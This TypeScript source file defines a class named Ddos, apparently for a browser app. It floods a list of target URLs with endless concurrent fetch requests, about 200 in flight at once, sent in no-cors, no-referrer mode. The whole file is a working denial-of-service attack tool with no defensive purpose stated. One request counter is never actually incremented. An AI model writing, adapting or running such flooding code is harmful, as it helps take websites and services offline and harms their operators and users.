export interface TargetDef {
    url: string
}

export interface Target {
    url: string
    requests: number
    errors: number
}

interface FetchConfig {
    timeout: number
}

export class Ddos {
    targets = ref<Array<Target>>([])
    CONCURRENCY_LIMIT = 200
    queue = new Array<Promise<any>>()

    isEmpty() {
        return this.targets.value.length == 0
    }

    setTargets(rawTargets: Array<TargetDef>){
        this.queue = []
        this.targets.value = rawTargets.map((def) => {
            return {
                url: def.url,
                requests: 0,
                errors: 0
            }
        })

        for(var i = 0; i < this.targets.value.length; i++){
            this.flood(i)
        }
    }

    private fetchWithTimeout(resource: string, options: FetchConfig) {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), options.timeout);
        return fetch(resource, {
            signal: controller.signal,
            mode: 'no-cors',
            referrerPolicy: 'no-referrer',
        })
            .then(response => {
                clearTimeout(id);
                return response;
            })
            .catch(error => {
                clearTimeout(id);
                throw error;
            });
    }

    private async flood(idx: number) {
        for (;;) {
            if (idx >= this.targets.value.length) break
            const target = this.targets.value[idx]
            if (this.queue.length > this.CONCURRENCY_LIMIT) {
                // eslint-disable-next-line no-await-in-loop
                await this.queue.shift();
            }

            const target_url = target.url
            this.queue.push(
                this.fetchWithTimeout(target_url, { timeout: 1000 })
                    .catch(error => {
                        if (error.code === 20) return;

                        target.errors++
                        console.log("failed1 "+target_url+error.message)
                    })
                    .then(response => {
                        if (response && !response.ok) {
                            target.errors++
                            console.log("failed2 "+target_url+" " + response.statusText)
                        }

                        target.requests
                    }),
            );
        }
    }
}